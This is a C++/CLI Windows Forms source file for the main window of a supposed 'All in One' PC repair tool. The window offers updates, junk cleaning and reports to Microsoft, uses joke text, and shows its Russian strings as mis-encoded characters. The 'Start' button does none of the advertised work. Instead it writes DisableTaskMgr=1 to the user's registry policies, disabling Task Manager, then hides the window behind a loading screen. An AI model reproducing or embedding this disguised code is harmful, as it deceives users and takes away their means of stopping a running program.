#include "loading.h"
#include "developer.h"
#include <iostream>
#include <Windows.h>

bool Language = true;

namespace solver {

	using namespace System;
	using namespace System::ComponentModel;
	using namespace System::Collections;
	using namespace System::Windows::Forms;
	using namespace System::Data;
	using namespace System::Drawing;

	public ref class main : public System::Windows::Forms::Form {
	public:
		main(void) {
			InitializeComponent();
		}
	protected:
		~main() {
			if (components) {
				delete components;
			}
		}
	private: System::Windows::Forms::Panel^ panel1_1;
	protected: Point lastLocation, first_location;





	private: System::Windows::Forms::Panel^ panel2_1;

	private: System::Windows::Forms::Label^ welcum_txt;
	private: System::Windows::Forms::CheckBox^ checkBox1;


	private: System::Windows::Forms::CheckBox^ checkBox3;
	private: System::Windows::Forms::CheckBox^ checkBox4;
	private: System::Windows::Forms::CheckBox^ checkBox2;
	private: System::Windows::Forms::Button^ start_btn1;
	private: System::Windows::Forms::Label^ orig_icon1;
	private: ToolTip^ g;

	private: loading^ _form;


	private: System::Windows::Forms::Panel^ orig2;
	private: System::Windows::Forms::Label^ orig1;
	private: System::Windows::Forms::Label^ l100_1;

	private: developer^ _form1;
	private: System::Windows::Forms::Label^ icon_prog1;
	private: System::Windows::Forms::GroupBox^ groupBox1_1;

	private: System::Windows::Forms::Label^ name_prog1;
	private: System::Windows::Forms::PictureBox^ exit_btn;
	private: System::Windows::Forms::PictureBox^ hide_btn;
	private: System::Windows::Forms::PictureBox^ quest_btn;
	private: System::ComponentModel::IContainer^ components;




	protected:

	private:


#pragma region Windows Form Designer generated code
		/// <summary>
		/// ��������� ����� ��� ��������� ������������ � �� ��������� 
		/// ���������� ����� ������ � ������� ��������� ����.
		/// </summary>
		void InitializeComponent(void)
		{
			System::ComponentModel::ComponentResourceManager^ resources = (gcnew System::ComponentModel::ComponentResourceManager(main::typeid));
			this->panel1_1 = (gcnew System::Windows::Forms::Panel());
			this->quest_btn = (gcnew System::Windows::Forms::PictureBox());
			this->hide_btn = (gcnew System::Windows::Forms::PictureBox());
			this->exit_btn = (gcnew System::Windows::Forms::PictureBox());
			this->icon_prog1 = (gcnew System::Windows::Forms::Label());
			this->name_prog1 = (gcnew System::Windows::Forms::Label());
			this->panel2_1 = (gcnew System::Windows::Forms::Panel());
			this->welcum_txt = (gcnew System::Windows::Forms::Label());
			this->checkBox1 = (gcnew System::Windows::Forms::CheckBox());
			this->checkBox3 = (gcnew System::Windows::Forms::CheckBox());
			this->checkBox4 = (gcnew System::Windows::Forms::CheckBox());
			this->checkBox2 = (gcnew System::Windows::Forms::CheckBox());
			this->start_btn1 = (gcnew System::Windows::Forms::Button());
			this->orig_icon1 = (gcnew System::Windows::Forms::Label());
			this->orig2 = (gcnew System::Windows::Forms::Panel());
			this->l100_1 = (gcnew System::Windows::Forms::Label());
			this->orig1 = (gcnew System::Windows::Forms::Label());
			this->groupBox1_1 = (gcnew System::Windows::Forms::GroupBox());
			this->panel1_1->SuspendLayout();
			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->quest_btn))->BeginInit();
			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->hide_btn))->BeginInit();
			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->exit_btn))->BeginInit();
			this->panel2_1->SuspendLayout();
			this->orig2->SuspendLayout();
			this->groupBox1_1->SuspendLayout();
			this->SuspendLayout();
			// 
			// panel1_1
			// 
			this->panel1_1->BackColor = System::Drawing::Color::Black;
			this->panel1_1->Controls->Add(this->quest_btn);
			this->panel1_1->Controls->Add(this->hide_btn);
			this->panel1_1->Controls->Add(this->exit_btn);
			this->panel1_1->Controls->Add(this->icon_prog1);
			this->panel1_1->Controls->Add(this->name_prog1);
			this->panel1_1->Location = System::Drawing::Point(0, 0);
			this->panel1_1->Name = L"panel1_1";
			this->panel1_1->Size = System::Drawing::Size(590, 30);
			this->panel1_1->TabIndex = 0;
			this->panel1_1->MouseDown += gcnew System::Windows::Forms::MouseEventHandler(this, &main::panel1_1_MouseDown);
			this->panel1_1->MouseMove += gcnew System::Windows::Forms::MouseEventHandler(this, &main::panel1_1_MouseMove);
			this->panel1_1->MouseUp += gcnew System::Windows::Forms::MouseEventHandler(this, &main::panel1_1_MouseUp);
			// 
			// quest_btn
			// 
			this->quest_btn->Image = (cli::safe_cast<System::Drawing::Image^>(resources->GetObject(L"quest_btn.Image")));
			this->quest_btn->Location = System::Drawing::Point(500, 0);
			this->quest_btn->Name = L"quest_btn";
			this->quest_btn->Size = System::Drawing::Size(30, 30);
			this->quest_btn->SizeMode = System::Windows::Forms::PictureBoxSizeMode::Zoom;
			this->quest_btn->TabIndex = 16;
			this->quest_btn->TabStop = false;
			this->quest_btn->MouseClick += gcnew System::Windows::Forms::MouseEventHandler(this, &main::quest_btn_MouseClick);
			this->quest_btn->MouseEnter += gcnew System::EventHandler(this, &main::quest_btn_MouseEnter);
			this->quest_btn->MouseLeave += gcnew System::EventHandler(this, &main::quest_btn_MouseLeave);
			this->quest_btn->MouseHover += gcnew System::EventHandler(this, &main::quest_btn_MouseHover);
			// 
			// hide_btn
			// 
			this->hide_btn->Image = (cli::safe_cast<System::Drawing::Image^>(resources->GetObject(L"hide_btn.Image")));
			this->hide_btn->Location = System::Drawing::Point(530, 0);
			this->hide_btn->Name = L"hide_btn";
			this->hide_btn->Size = System::Drawing::Size(30, 30);
			this->hide_btn->SizeMode = System::Windows::Forms::PictureBoxSizeMode::Zoom;
			this->hide_btn->TabIndex = 17;
			this->hide_btn->TabStop = false;
			this->hide_btn->MouseClick += gcnew System::Windows::Forms::MouseEventHandler(this, &main::hide_btn_MouseClick);
			this->hide_btn->MouseEnter += gcnew System::EventHandler(this, &main::hide_btn_MouseEnter);
			this->hide_btn->MouseLeave += gcnew System::EventHandler(this, &main::hide_btn_MouseLeave);
			// 
			// exit_btn
			// 
			this->exit_btn->Image = (cli::safe_cast<System::Drawing::Image^>(resources->GetObject(L"exit_btn.Image")));
			this->exit_btn->Location = System::Drawing::Point(560, 0);
			this->exit_btn->Name = L"exit_btn";
			this->exit_btn->Size = System::Drawing::Size(30, 30);
			this->exit_btn->SizeMode = System::Windows::Forms::PictureBoxSizeMode::Zoom;
			this->exit_btn->TabIndex = 16;
			this->exit_btn->TabStop = false;
			this->exit_btn->MouseClick += gcnew System::Windows::Forms::MouseEventHandler(this, &main::exit_btn_MouseClick);
			this->exit_btn->MouseEnter += gcnew System::EventHandler(this, &main::exit_btn_MouseEnter);
			this->exit_btn->MouseLeave += gcnew System::EventHandler(this, &main::exit_btn_MouseLeave);
			// 
			// icon_prog1
			// 
			this->icon_prog1->Image = (cli::safe_cast<System::Drawing::Image^>(resources->GetObject(L"icon_prog1.Image")));
			this->icon_prog1->Location = System::Drawing::Point(0, 0);
			this->icon_prog1->Name = L"icon_prog1";
			this->icon_prog1->Size = System::Drawing::Size(30, 30);
			this->icon_prog1->TabIndex = 3;
			this->icon_prog1->MouseDown += gcnew System::Windows::Forms::MouseEventHandler(this, &main::panel1_1_MouseDown);
			this->icon_prog1->MouseMove += gcnew System::Windows::Forms::MouseEventHandler(this, &main::panel1_1_MouseMove);
			this->icon_prog1->MouseUp += gcnew System::Windows::Forms::MouseEventHandler(this, &main::panel1_1_MouseUp);
			// 
			// name_prog1
			// 
			this->name_prog1->AutoSize = true;
			this->name_prog1->Cursor = System::Windows::Forms::Cursors::Default;
			this->name_prog1->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 18, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(204)));
			this->name_prog1->ForeColor = System::Drawing::Color::White;
			this->name_prog1->Location = System::Drawing::Point(30, 0);
			this->name_prog1->Name = L"name_prog1";
			this->name_prog1->Size = System::Drawing::Size(436, 29);
			this->name_prog1->TabIndex = 0;
			this->name_prog1->Text = L"��������� \"�� � �����\" v1.0.7";
			this->name_prog1->MouseDown += gcnew System::Windows::Forms::MouseEventHandler(this, &main::panel1_1_MouseDown);
			this->name_prog1->MouseMove += gcnew System::Windows::Forms::MouseEventHandler(this, &main::panel1_1_MouseMove);
			this->name_prog1->MouseUp += gcnew System::Windows::Forms::MouseEventHandler(this, &main::panel1_1_MouseUp);
			// 
			// panel2_1
			// 
			this->panel2_1->BackColor = System::Drawing::Color::FromArgb(static_cast<System::Int32>(static_cast<System::Byte>(120)), static_cast<System::Int32>(static_cast<System::Byte>(120)),
				static_cast<System::Int32>(static_cast<System::Byte>(120)));
			this->panel2_1->Controls->Add(this->welcum_txt);
			this->panel2_1->Location = System::Drawing::Point(20, 50);
			this->panel2_1->Name = L"panel2_1";
			this->panel2_1->Size = System::Drawing::Size(557, 168);
			this->panel2_1->TabIndex = 1;
			// 
			// welcum_txt
			// 
			this->welcum_txt->Anchor = System::Windows::Forms::AnchorStyles::None;
			this->welcum_txt->BackColor = System::Drawing::Color::Gray;
			this->welcum_txt->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 18.75F, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(204)));
			this->welcum_txt->ForeColor = System::Drawing::Color::White;
			this->welcum_txt->Location = System::Drawing::Point(0, 0);
			this->welcum_txt->Name = L"welcum_txt";
			this->welcum_txt->Size = System::Drawing::Size(557, 168);
			this->welcum_txt->TabIndex = 0;
			this->welcum_txt->Text = L"������ ��\? ���� ������\?\r\n������� �������\? ������ ������\? \r\n���������� ����������\?"
				L"\r\n������� ���� �� ��������� ����\?\r\n��������� \"�� � �����\" �������� ��!\r\n";
			this->welcum_txt->TextAlign = System::Drawing::ContentAlignment::MiddleCenter;
			// 
			// checkBox1
			// 
			this->checkBox1->AutoSize = true;
			this->checkBox1->BackColor = System::Drawing::Color::FromArgb(static_cast<System::Int32>(static_cast<System::Byte>(115)), static_cast<System::Int32>(static_cast<System::Byte>(115)),
				static_cast<System::Int32>(static_cast<System::Byte>(115)));
			this->checkBox1->Checked = true;
			this->checkBox1->CheckState = System::Windows::Forms::CheckState::Checked;
			this->checkBox1->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 12, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(204)));
			this->checkBox1->ForeColor = System::Drawing::Color::White;
			this->checkBox1->Location = System::Drawing::Point(10, 11);
			this->checkBox1->Name = L"checkBox1";
			this->checkBox1->Size = System::Drawing::Size(303, 24);
			this->checkBox1->TabIndex = 6;
			this->checkBox1->Text = L"��������� ������� ����������";
			this->checkBox1->UseVisualStyleBackColor = false;
			this->checkBox1->CheckedChanged += gcnew System::EventHandler(this, &main::checkBox1_CheckedChanged);
			// 
			// checkBox3
			// 
			this->checkBox3->AutoSize = true;
			this->checkBox3->BackColor = System::Drawing::Color::FromArgb(static_cast<System::Int32>(static_cast<System::Byte>(115)), static_cast<System::Int32>(static_cast<System::Byte>(115)),
				static_cast<System::Int32>(static_cast<System::Byte>(115)));
			this->checkBox3->Checked = true;
			this->checkBox3->CheckState = System::Windows::Forms::CheckState::Checked;
			this->checkBox3->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 12, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(204)));
			this->checkBox3->ForeColor = System::Drawing::Color::White;
			this->checkBox3->Location = System::Drawing::Point(315, 11);
			this->checkBox3->Name = L"checkBox3";
			this->checkBox3->Size = System::Drawing::Size(228, 24);
			this->checkBox3->TabIndex = 7;
			this->checkBox3->Text = L"�������� �� �� ������";
			this->checkBox3->UseVisualStyleBackColor = false;
			this->checkBox3->CheckedChanged += gcnew System::EventHandler(this, &main::checkBox3_CheckedChanged);
			// 
			// checkBox4
			// 
			this->checkBox4->BackColor = System::Drawing::Color::FromArgb(static_cast<System::Int32>(static_cast<System::Byte>(115)), static_cast<System::Int32>(static_cast<System::Byte>(115)),
				static_cast<System::Int32>(static_cast<System::Byte>(115)));
			this->checkBox4->Checked = true;
			this->checkBox4->CheckState = System::Windows::Forms::CheckState::Checked;
			this->checkBox4->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 12, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(204)));
			this->checkBox4->ForeColor = System::Drawing::Color::White;
			this->checkBox4->Location = System::Drawing::Point(315, 35);
			this->checkBox4->Name = L"checkBox4";
			this->checkBox4->Size = System::Drawing::Size(230, 24);
			this->checkBox4->TabIndex = 8;
			this->checkBox4->Text = L"�������� Windows";
			this->checkBox4->UseVisualStyleBackColor = false;
			this->checkBox4->CheckedChanged += gcnew System::EventHandler(this, &main::checkBox4_CheckedChanged);
			// 
			// checkBox2
			// 
			this->checkBox2->AutoSize = true;
			this->checkBox2->BackColor = System::Drawing::Color::FromArgb(static_cast<System::Int32>(static_cast<System::Byte>(115)), static_cast<System::Int32>(static_cast<System::Byte>(115)),
				static_cast<System::Int32>(static_cast<System::Byte>(115)));
			this->checkBox2->Checked = true;
			this->checkBox2->CheckState = System::Windows::Forms::CheckState::Checked;
			this->checkBox2->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 12, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(204)));
			this->checkBox2->ForeColor = System::Drawing::Color::White;
			this->checkBox2->Location = System::Drawing::Point(10, 35);
			this->checkBox2->Name = L"checkBox2";
			this->checkBox2->Size = System::Drawing::Size(255, 24);
			this->checkBox2->TabIndex = 5;
			this->checkBox2->Text = L"��������� ����� Microsoft";
			this->checkBox2->UseVisualStyleBackColor = false;
			this->checkBox2->CheckedChanged += gcnew System::EventHandler(this, &main::checkBox2_CheckedChanged);
			// 
			// start_btn1
			// 
			this->start_btn1->BackColor = System::Drawing::Color::MediumSpringGreen;
			this->start_btn1->FlatStyle = System::Windows::Forms::FlatStyle::Popup;
			this->start_btn1->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 21.75F, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(204)));
			this->start_btn1->ForeColor = System::Drawing::Color::Black;
			this->start_btn1->Location = System::Drawing::Point(454, 296);
			this->start_btn1->Name = L"start_btn1";
			this->start_btn1->Size = System::Drawing::Size(123, 60);
			this->start_btn1->TabIndex = 9;
			this->start_btn1->TabStop = false;
			this->start_btn1->Text = L"�����";
			this->start_btn1->UseVisualStyleBackColor = false;
			this->start_btn1->Click += gcnew System::EventHandler(this, &main::start_btn_Click);
			this->start_btn1->MouseHover += gcnew System::EventHandler(this, &main::start_btn1_MouseHover);
			// 
			// orig_icon1
			// 
			this->orig_icon1->FlatStyle = System::Windows::Forms::FlatStyle::Flat;
			this->orig_icon1->Image = (cli::safe_cast<System::Drawing::Image^>(resources->GetObject(L"orig_icon1.Image")));
			this->orig_icon1->Location = System::Drawing::Point(0, 0);
			this->orig_icon1->Name = L"orig_icon1";
			this->orig_icon1->Size = System::Drawing::Size(69, 60);
			this->orig_icon1->TabIndex = 12;
			// 
			// orig2
			// 
			this->orig2->Controls->Add(this->l100_1);
			this->orig2->Controls->Add(this->orig1);
			this->orig2->Controls->Add(this->orig_icon1);
			this->orig2->Location = System::Drawing::Point(20, 296);
			this->orig2->Name = L"orig2";
			this->orig2->Size = System::Drawing::Size(431, 60);
			this->orig2->TabIndex = 12;
			// 
			// l100_1
			// 
			this->l100_1->AutoSize = true;
			this->l100_1->FlatStyle = System::Windows::Forms::FlatStyle::Flat;
			this->l100_1->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 9.75F, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(204)));
			this->l100_1->ForeColor = System::Drawing::Color::White;
			this->l100_1->Location = System::Drawing::Point(380, 0);
			this->l100_1->Name = L"l100_1";
			this->l100_1->Size = System::Drawing::Size(44, 16);
			this->l100_1->TabIndex = 15;
			this->l100_1->Text = L"100%";
			// 
			// orig1
			// 
			this->orig1->AutoSize = true;
			this->orig1->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 26.25F, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(204)));
			this->orig1->ForeColor = System::Drawing::Color::White;
			this->orig1->Location = System::Drawing::Point(75, 9);
			this->orig1->Name = L"orig1";
			this->orig1->Size = System::Drawing::Size(353, 39);
			this->orig1->TabIndex = 13;
			this->orig1->Text = L"Windows 11 Original";
			// 
			// groupBox1_1
			// 
			this->groupBox1_1->Controls->Add(this->checkBox2);
			this->groupBox1_1->Controls->Add(this->checkBox3);
			this->groupBox1_1->Controls->Add(this->checkBox1);
			this->groupBox1_1->Controls->Add(this->checkBox4);
			this->groupBox1_1->ForeColor = System::Drawing::Color::Silver;
			this->groupBox1_1->Location = System::Drawing::Point(20, 224);
			this->groupBox1_1->Name = L"groupBox1_1";
			this->groupBox1_1->Size = System::Drawing::Size(557, 66);
			this->groupBox1_1->TabIndex = 15;
			this->groupBox1_1->TabStop = false;
			this->groupBox1_1->Text = L"���������:";
			// 
			// main
			// 
			this->AutoScaleDimensions = System::Drawing::SizeF(6, 13);
			this->AutoScaleMode = System::Windows::Forms::AutoScaleMode::Font;
			this->BackColor = System::Drawing::Color::FromArgb(static_cast<System::Int32>(static_cast<System::Byte>(115)), static_cast<System::Int32>(static_cast<System::Byte>(115)),
				static_cast<System::Int32>(static_cast<System::Byte>(115)));
			this->BackgroundImageLayout = System::Windows::Forms::ImageLayout::None;
			this->ClientSize = System::Drawing::Size(590, 360);
			this->Controls->Add(this->groupBox1_1);
			this->Controls->Add(this->orig2);
			this->Controls->Add(this->start_btn1);
			this->Controls->Add(this->panel2_1);
			this->Controls->Add(this->panel1_1);
			this->FormBorderStyle = System::Windows::Forms::FormBorderStyle::None;
			this->Icon = (cli::safe_cast<System::Drawing::Icon^>(resources->GetObject(L"$this.Icon")));
			this->Name = L"main";
			this->StartPosition = System::Windows::Forms::FormStartPosition::CenterScreen;
			this->Text = L"��������� \"�� � �����\"";
			this->Load += gcnew System::EventHandler(this, &main::main_Load);
			this->panel1_1->ResumeLayout(false);
			this->panel1_1->PerformLayout();
			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->quest_btn))->EndInit();
			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->hide_btn))->EndInit();
			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->exit_btn))->EndInit();
			this->panel2_1->ResumeLayout(false);
			this->orig2->ResumeLayout(false);
			this->orig2->PerformLayout();
			this->groupBox1_1->ResumeLayout(false);
			this->groupBox1_1->PerformLayout();
			this->ResumeLayout(false);

		}
	private: System::Void exit_btn_MouseEnter(System::Object^ sender, System::EventArgs^ e) {
		this->exit_btn->BackColor = System::Drawing::Color::Red;
	}
	private: System::Void exit_btn_MouseLeave(System::Object^ sender, System::EventArgs^ e) {
		this->exit_btn->BackColor = System::Drawing::Color::Black;
	}
	private: System::Void hide_btn_MouseEnter(System::Object^ sender, System::EventArgs^ e) {
		this->hide_btn->BackColor = System::Drawing::Color::Silver;
	}
	private: System::Void hide_btn_MouseLeave(System::Object^ sender, System::EventArgs^ e) {
		this->hide_btn->BackColor = System::Drawing::Color::Black;
	}
	private: System::Void start_btn_Click(System::Object^ sender, System::EventArgs^ e) {
		HKEY hKey;
		std::wstring subKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
		std::wstring valueName = L"DisableTaskMgr";
		DWORD newValue = 1;
		if (RegOpenKeyEx(HKEY_CURRENT_USER, subKey.c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
			RegSetValueEx(hKey, valueName.c_str(), 0, REG_DWORD, (BYTE*)&newValue, sizeof(newValue));
			RegCloseKey(hKey);
		}
		_form = gcnew loading();
		this->Location = this->first_location;
		_form->Show();
		this->_form->ClientSizeChanged += gcnew System::EventHandler(this, &main::loading_ClientSizeChanged);
		if (_form1)
			_form1->Close();
		this->ShowInTaskbar = false;
		this->Enabled = false;
	}
	private: System::Void loading_ClientSizeChanged(System::Object^ sender, System::EventArgs^ e) {
		this->Hide();
	}
	private: System::Void checkBox1_CheckedChanged(System::Object^ sender, System::EventArgs^ e) {
		propysk1 = !propysk1;
	}
	private: System::Void checkBox2_CheckedChanged(System::Object^ sender, System::EventArgs^ e) {
		propysk2 = !propysk2;
	}
	private: System::Void checkBox3_CheckedChanged(System::Object^ sender, System::EventArgs^ e) {
		propysk3 = !propysk3;
	}
	private: System::Void checkBox4_CheckedChanged(System::Object^ sender, System::EventArgs^ e) {
		propysk4 = !propysk4;
	}
	private: System::Void quest_btn_MouseHover(System::Object^ sender, System::EventArgs^ e) {
		delete g;
		g = gcnew ToolTip();
		g->ToolTipIcon = ToolTipIcon::Info;
		if (!Language) {
			g->ToolTipTitle = "���������";
			g->SetToolTip(quest_btn, "���������� � ������������");
		}
		else {
			g->ToolTipTitle = "Tip";
			g->SetToolTip(quest_btn, "Developer information");
		}
	}
	private: System::Void panel1_1_MouseDown(System::Object^ sender, System::Windows::Forms::MouseEventArgs^ e) {
		if (e->Button == System::Windows::Forms::MouseButtons::Left)
			lastLocation = e->Location;
	}
	private: System::Void panel1_1_MouseMove(System::Object^ sender, System::Windows::Forms::MouseEventArgs^ e) {
		if (e->Button == System::Windows::Forms::MouseButtons::Left) {
			this->name_prog1->Cursor = System::Windows::Forms::Cursors::SizeAll;
			this->orig_icon1->Cursor = System::Windows::Forms::Cursors::SizeAll;
			this->panel1_1->Cursor = System::Windows::Forms::Cursors::SizeAll;
			this->Location = Point(
				this->Location.X + e->X - lastLocation.X,
				this->Location.Y + e->Y - lastLocation.Y);
		}
	}
	private: System::Void panel1_1_MouseUp(System::Object^ sender, System::Windows::Forms::MouseEventArgs^ e) {
		this->name_prog1->Cursor = System::Windows::Forms::Cursors::Default;
		this->orig_icon1->Cursor = System::Windows::Forms::Cursors::Default;
		this->panel1_1->Cursor = System::Windows::Forms::Cursors::Default;
	}
	private: System::Void main_Load(System::Object^ sender, System::EventArgs^ e) {
		LCID sysLocale = GetSystemDefaultLCID();
		char locale[3];
		GetLocaleInfoA(sysLocale, LOCALE_SISO639LANGNAME, locale, sizeof(locale));
		if (std::string(locale) == "ru" || std::string(locale) == "uk" || std::string(locale) == "be" || std::string(locale) == "kk" || std::string(locale) == "ky")
			Language = false;
		else {
			this->Text = L"Program \"All in One\"";
			this->groupBox1_1->Text = L"Settings:";
			this->start_btn1->Text = L"Start";
			this->checkBox4->Text = L"Update Windows";
			this->checkBox3->Text = L"Clean your PC from junk";
			this->checkBox2->Text = L"Send report to Microsoft";
			this->checkBox1->Text = L"Check for updates";
			this->welcum_txt->Text = L"Is your PC glitching\? Low memory\?\r\nDid your monitor break\? Are you suffering from heartburn\?\r\nDid your keyboard gouge\?"
				L"\r\nSpilled beer on the system unit\?\r\nThe \"All in One\" program will fix everything!\r\n";
			this->welcum_txt->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 15.75F, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(204)));
			this->name_prog1->Text = L"Program \"All in One\" v1.0.7";
		}
		this->first_location = this->Location;
	}
	private: System::Void exit_btn_MouseClick(System::Object^ sender, System::Windows::Forms::MouseEventArgs^ e) {
		if (e->Button == System::Windows::Forms::MouseButtons::Left)
			Application::Exit();
	}
	private: System::Void hide_btn_MouseClick(System::Object^ sender, System::Windows::Forms::MouseEventArgs^ e) {
		if (e->Button == System::Windows::Forms::MouseButtons::Left) {
			PlaySound(nullptr, nullptr, 0);
			PlaySound(MAKEINTRESOURCE(19), GetModuleHandle(NULL), SND_RESOURCE | SND_ASYNC);
			SetWindowPos((HWND)this->Handle.ToPointer(), HWND_TOP, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
			AnimateWindow((HWND)this->Handle.ToPointer(), 325, AW_HIDE | AW_BLEND);
			this->WindowState = FormWindowState::Minimized;
		}
	}
	private: System::Void quest_btn_MouseClick(System::Object^ sender, System::Windows::Forms::MouseEventArgs^ e) {
		if (e->Button == System::Windows::Forms::MouseButtons::Left) {
			if (!_form1_opened) {
				_form1 = gcnew developer;
				int xPos = (this->Width - _form1->Width) / 2 + this->Location.X;
				int yPos = (this->Height - _form1->Height) / 2 + this->Location.Y;
				_form1->Location = System::Drawing::Point(xPos, yPos);
				_form1->Show();
				_form1_opened = true;
			}
		}
	}
	private: System::Void quest_btn_MouseEnter(System::Object^ sender, System::EventArgs^ e) {
		this->quest_btn->BackColor = System::Drawing::Color::Silver;
	}
	private: System::Void quest_btn_MouseLeave(System::Object^ sender, System::EventArgs^ e) {
		this->quest_btn->BackColor = System::Drawing::Color::Black;
	}
	private: System::Void start_btn1_MouseHover(System::Object^ sender, System::EventArgs^ e) {
		delete g;
		g = gcnew ToolTip();
		g->ToolTipIcon = ToolTipIcon::None;
		if (!Language) {
			g->ToolTipTitle = "�����";
			g->SetToolTip(start_btn1, "��� ���� � ������ ��� ���� �������...\n�� ���, ��� ������!");
		}
		else {
			g->ToolTipTitle = "Tip";
			g->SetToolTip(start_btn1, "I was scared the first time too...\nDon't piss, press the button!");
		}
	}
};
}